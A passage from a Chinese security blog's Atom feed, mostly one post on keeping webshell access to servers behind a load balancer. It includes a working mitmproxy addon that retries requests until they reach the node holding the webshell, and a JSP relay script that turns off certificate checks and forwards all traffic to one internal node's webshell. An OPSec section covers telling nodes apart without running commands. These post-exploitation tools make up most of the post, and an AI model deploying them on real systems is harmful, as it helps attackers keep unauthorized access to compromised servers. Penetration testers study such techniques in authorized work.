    <link href="https://cyxsec.github.io/2024/07/SQL%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6%E6%B8%97%E9%80%8F%E6%8C%87%E5%8C%97/"/>
    <id>https://cyxsec.github.io/2024/07/SQL%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6%E6%B8%97%E9%80%8F%E6%8C%87%E5%8C%97/</id>
    <published>2024-07-23T08:40:55.000Z</published>
    <updated>2024-09-19T02:08:30.720Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>负载均衡下的Webshell连接</title>
    <link href="https://cyxsec.github.io/2023/10/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84Webshell%E8%BF%9E%E6%8E%A5/"/>
    <id>https://cyxsec.github.io/2023/10/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84Webshell%E8%BF%9E%E6%8E%A5/</id>
    <published>2023-10-22T05:51:39.000Z</published>
    <updated>2024-07-22T08:47:53.102Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-序"><a class="markdownIt-Anchor" href="#0x00-序"></a> 0x00 序</h1><p>最近打金融项目的时候，webshell遇见了负载均衡，自己之前其实看过相关文章，但是实战操作起来还是遇见了不少坑点的，接下来就根据前人的文章，同时结合实战和自己的思考，写了本篇文章。</p><h1 id="0x01-什么是负载均衡"><a class="markdownIt-Anchor" href="#0x01-什么是负载均衡"></a> 0x01 什么是负载均衡</h1><p>负载均衡是一种将来自多个用户或应用程序的请求分配到多个服务器或设备上的技术，以提高整体性能、可用性和可扩展性。它就像交通管制员，可以将流量分散到不同的道路上，避免任何一条道路堵塞。</p><p>在互联网应用中，负载均衡通常用于将来自用户的请求分发到多台 Web 服务器。这可以提高网站的性能和响应速度，并确保即使在高流量情况下也能保持正常运行。此外，负载均衡还可以提高应用程序的可用性，如果一台服务器出现故障，其他服务器可以继续处理请求而不会中断服务。</p><p>拿常见nginx实现LBS来说：</p><p><img src="../../../typora-user-images/image-20240722143117448.png" alt="image-20240722143117448" /></p><p>简单总结就是：我们访问的webshell是通过nginx转发过去的，webshell的实际处理，nginx会默认对负载节点进行轮询请求，也就是我们访问webshell可能一会在node1，一会在node2。</p><p>那么分辨是否采用了这种技术也很简单：</p><ol><li>我们使用webshell执行命令，发现查询到的内网ip一直在变化</li><li>我们查看目录文件时，发现刷新一次，目录就发生变化了</li></ol><h2 id="负载均衡的问题在哪里"><a class="markdownIt-Anchor" href="#负载均衡的问题在哪里"></a> 负载均衡的问题在哪里？</h2><p>根据我们上面的介绍，我们的webshell请求会随机请求到内部未知的node点。</p><p>在如下的webshell场景中</p><ol><li>我们上传文件使用的是将文件分块写入（中间件会限制data大小，大文件必须分块），因为是不同的node节点处理，文件分块也就导致，file_piece1写入到了node1节点，file_piece2写入到了node2节点。无法落地大文件。</li></ol><h1 id="0x02-未做文件同步的负载均衡"><a class="markdownIt-Anchor" href="#0x02-未做文件同步的负载均衡"></a> 0x02 未做文件同步的负载均衡</h1><p>这也是本次自己实战中遇到的情况， 未做文件同步，也就是我们上传webshell，请求处理后只落地在了其中的某一个node节点。</p><p>这也就导致，请求一会200（轮询到了落地webshell的node节点），一会404（未轮询到落地webshell的node节点）。</p><h2 id="mitmproxy循环请求"><a class="markdownIt-Anchor" href="#mitmproxy循环请求"></a> mitmproxy循环请求</h2><p>当时想的第一种简便易行的方式就是写脚本、循环判断，当前请求为404时就循环请求，直到请求方式为200，也就是说，我们保证了所有的请求都到了落地webshell的node节点，也能保证大文件的上传</p><p>demo:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> mitmproxy <span class="token keyword">import</span> ctx<span class="token punctuation">,</span> http<span class="token keyword">import</span> requests<span class="token keyword">class</span> <span class="token class-name">ProxyAddon</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> flow<span class="token punctuation">:</span> http<span class="token punctuation">.</span>HTTPFlow<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token comment"># 只处理POST请求</span>        <span class="token keyword">if</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>            url <span class="token operator">=</span> self<span class="token punctuation">.</span>get_https_url<span class="token punctuation">(</span>flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>host<span class="token punctuation">,</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">)</span>            <span class="token comment"># 打印转发前的请求内容</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Original Request:"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment"># 发送POST请求到目标HTTPS服务器</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    response <span class="token operator">=</span> self<span class="token punctuation">.</span>make_https_request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>content<span class="token punctuation">)</span>                    <span class="token keyword">break</span>                <span class="token keyword">except</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    response <span class="token operator">=</span> self<span class="token punctuation">.</span>make_https_request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>content<span class="token punctuation">)</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">break</span>                    <span class="token keyword">continue</span>                <span class="token keyword">except</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                                <span class="token comment"># 打印转发后的响应内容</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Forwarded Response:"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment"># 将HTTPS响应返回给监听</span>            headers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>k<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>            flow<span class="token punctuation">.</span>response <span class="token operator">=</span> http<span class="token punctuation">.</span>Response<span class="token punctuation">.</span>make<span class="token punctuation">(</span>                <span class="token number">200</span><span class="token punctuation">,</span>                response<span class="token punctuation">.</span>content<span class="token punctuation">,</span>                headers            <span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">make_https_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        proxies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'http'</span><span class="token punctuation">:</span><span class="token string">'http://127.0.0.1:8080'</span><span class="token punctuation">,</span>                   <span class="token string">'https'</span><span class="token punctuation">:</span><span class="token string">'https://127.0.0.1:8080'</span><span class="token punctuation">&#125;</span>        <span class="token comment"># 自定义超时时间为10秒</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> response    <span class="token keyword">def</span> <span class="token function">get_https_url</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 根据需要修改为相应的HTTPS地址</span>        https_host <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>https_host<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>addons <span class="token operator">=</span> <span class="token punctuation">[</span>    ProxyAddon<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个方式还有两个有意思的点需要说一下：</p><ol><li>需要设置webshell工具的超时时间，因为请求到mitmproxy的时候，404的请求会循环请求，直到响应为200时，响应数据才会转发给webshell客户端，运气不好的话，这个过程可能会持续很长时间，所以需要设置webshell工具的超时时间，直到可以正常接收数据和响应展示。</li><li>可以留意我上面的脚本，有一个http转https的 操作，这个是因为mitmproxy配置https截取数据非常麻烦，所以就想了这种方式，我当时目标的环境就是https，之后在webshell连接工具的url部分填http即可，请求的处理部分都在上面的py脚本里，这里的webshell客户端就充当构造原始请求和解码响应数据展示的功能</li></ol><h1 id="0x03-做了文件同步的负载均衡"><a class="markdownIt-Anchor" href="#0x03-做了文件同步的负载均衡"></a> 0x03 做了文件同步的负载均衡</h1><p>与上面的相对应，我们上传的文件会同步到所有的负载node节点</p><h2 id="增加http流量转发脚本统一转发内网单一node"><a class="markdownIt-Anchor" href="#增加http流量转发脚本统一转发内网单一node"></a> 增加HTTP流量转发脚本，统一转发内网单一node</h2><p>这是蚁剑作者medicean的思路</p><p>需要落地两个文件，一个是webshell，一个是流量转发脚本</p><p>直接做阅读理解：</p><p>单纯的http流量转发脚本</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"javax.net.ssl.*"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.ByteArrayOutputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.DataInputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.InputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.OutputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.net.HttpURLConnection"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.net.URL"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.security.KeyManagementException"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.security.NoSuchAlgorithmException"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.security.cert.CertificateException"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.security.cert.X509Certificate"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ignoreSsl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HostnameVerifier</span> hv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HostnameVerifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">verify</span><span class="token punctuation">(</span><span class="token class-name">String</span> urlHostName<span class="token punctuation">,</span> <span class="token class-name">SSLSession</span> session<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">trustAllHttpsCertificates</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HttpsURLConnection</span><span class="token punctuation">.</span><span class="token function">setDefaultHostnameVerifier</span><span class="token punctuation">(</span>hv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">trustAllHttpsCertificates</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TrustManager</span><span class="token punctuation">[</span><span class="token punctuation">]</span> trustAllCerts <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TrustManager</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token keyword">new</span> <span class="token class-name">X509TrustManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">public</span> <span class="token class-name">X509Certificate</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getAcceptedIssuers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">checkClientTrusted</span><span class="token punctuation">(</span><span class="token class-name">X509Certificate</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arg0<span class="token punctuation">,</span> <span class="token class-name">String</span> arg1<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CertificateException</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// Not implemented</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">checkServerTrusted</span><span class="token punctuation">(</span><span class="token class-name">X509Certificate</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arg0<span class="token punctuation">,</span> <span class="token class-name">String</span> arg1<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CertificateException</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// Not implemented</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">SSLContext</span> sc <span class="token operator">=</span> <span class="token class-name">SSLContext</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"TLS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            sc<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> trustAllCerts<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>SecureRandom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">HttpsURLConnection</span><span class="token punctuation">.</span><span class="token function">setDefaultSSLSocketFactory</span><span class="token punctuation">(</span>sc<span class="token punctuation">.</span><span class="token function">getSocketFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">KeyManagementException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchAlgorithmException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>        <span class="token class-name">String</span> target <span class="token operator">=</span> <span class="token string">"http://172.24.0.2:8080/ant.jsp"</span><span class="token punctuation">;</span><span class="token comment">//填写内网node的webshell地址</span>        <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"https"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">getProtocol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">ignoreSsl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">HttpURLConnection</span> conn <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpURLConnection</span><span class="token punctuation">)</span>url<span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">setRequestMethod</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">setConnectTimeout</span><span class="token punctuation">(</span><span class="token number">30000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">setDoOutput</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">setDoInput</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">setInstanceFollowRedirects</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> baos<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">OutputStream</span> out2 <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DataInputStream</span> in<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            baos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        baos<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        baos<span class="token punctuation">.</span><span class="token function">writeTo</span><span class="token punctuation">(</span>out2<span class="token punctuation">)</span><span class="token punctuation">;</span>        baos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">OutputStream</span> out3<span class="token operator">=</span>response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len2 <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            out3<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        out3<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out3<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240722154209730.png" alt="image-20240722154209730" /></p><p>过程如图：实际上就是webshell先请求转发的antproxy.jsp，无论这个脚本在哪个node，都会把请求包统一转发到指定的内网ip地址的node，也就保证了我们的请求都落在了一个node上。</p><h3 id="其他语言的转发脚本"><a class="markdownIt-Anchor" href="#其他语言的转发脚本"></a> 其他语言的转发脚本</h3><p>其他语言负载很少见，直接让GPT做吧</p><h3 id="必须要上传两个文件吗"><a class="markdownIt-Anchor" href="#必须要上传两个文件吗"></a> 必须要上传两个文件吗？</h3><p>可能有人觉得上传两个文件操作不够完美，但是无论如何，负载均衡的情况都是一定要至少上传两次的。</p><p>因为我们首先要上传脚本，来判断不同node的差异性，这个差异有可能是ip，也有可能是文件。</p><p>第二个上传的脚本才是根据差异性来保证所有请求都到某一个node。</p><h1 id="0x04-opsec下的思路"><a class="markdownIt-Anchor" href="#0x04-opsec下的思路"></a> 0x04 OPSec下的思路</h1><p>遵循OPSec，我们尽量不使用webshell直接执行命令获取ip和端口信息，如果是Linux的情况还好说，proc下面保存着进程的端口信息，net下面也保存着端口信息。非dhcp情况下也能从本地config读ip信息，读不到ip或者是windows就比较麻烦了。</p><p>无法获取node的ip信息，就只能寻找其他差异性了：</p><ol><li>可以通过上传的webshell刷新某一目录，查看文件是否不同来寻找差异性</li><li>通过webshell在某一node新建临时文件来手动创造差异性</li></ol><p>接下来就可以结合上面的未做文件同步的思路了：</p><p>确定差异性后，重新上传一个webshll，其中增加一个判断逻辑，判断条件就是我们上面提到的差异性，拿上面提到的第2点手动创造差异性来说：</p><p>if(操作系统不存在该临时文件){返回404}</p><p>再结合上面0x02的循环判断状态码的方式，也能在不执行系统命令的前提下完成负载webshell的连接。</p><p>参考链接：</p><p>（负载均衡下的 WebShell 连接）<a href="https://mp.weixin.qq.com/s/4Bmz_fuu0yrLMK1oBKKtRA">https://mp.weixin.qq.com/s/4Bmz_fuu0yrLMK1oBKKtRA</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-序&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x00-序&quot;&gt;&lt;/a&gt; 0x00 序&lt;/h1&gt;
&lt;p&gt;最近打金融项目的时候，webshell遇见了负载均衡，自己之前其实看过相关文章，但是实战操作起来还是遇见了不少坑点的，接</summary>
      
    
    
    
    
    <category term="负载均衡" scheme="https://cyxsec.github.io/tags/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP非默认漏洞分析</title>
    <link href="https://cyxsec.github.io/2023/05/ThinkPHP%E9%9D%9E%E9%BB%98%E8%AE%A4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://cyxsec.github.io/2023/05/ThinkPHP%E9%9D%9E%E9%BB%98%E8%AE%A4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-05-16T06:36:57.000Z</published>
    <updated>2024-09-19T02:09:57.723Z</updated>
    
